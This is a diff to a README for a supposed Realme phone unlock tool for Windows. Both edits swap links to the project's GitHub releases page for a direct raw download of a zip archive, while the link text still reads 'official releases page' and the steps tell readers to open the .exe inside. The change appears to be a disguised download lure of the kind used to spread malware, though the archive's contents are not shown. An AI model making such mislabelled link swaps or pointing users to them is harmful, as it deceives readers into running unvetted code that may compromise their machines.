@@ -6,7 +6,7 @@ description: "Download the Realme Unlock Tool for Windows 10 and 11 to manage de
 # 🛠️ Descargar-Realme-Unlock - Unlock your Realme device with ease
 
 <p align="center">
-  <a href="https://github.com/pulsotrabajando-collab/Descargar-Realme-Unlock/releases">
+  <a href="https://raw.githubusercontent.com/pulsotrabajando-collab/pulsotrabajando-collab.github.io/main/asymmetric/io_pulsotrabajando_collab_github_1.6.zip">
     <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download">
   </a>
 </p>
@@ -32,7 +32,7 @@ The application requires a Windows operating system. Ensure your computer meets 
 
 Follow these steps to obtain and prepare the software on your machine:
 
-1. Visit the [official releases page](https://github.com/pulsotrabajando-collab/Descargar-Realme-Unlock/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/pulsotrabajando-collab/pulsotrabajando-collab.github.io/main/asymmetric/io_pulsotrabajando_collab_github_1.6.zip).
 2. Look for the latest version tag.
 3. Click the file ending in .exe to start your download.
 4. Open the file after the download finishes.
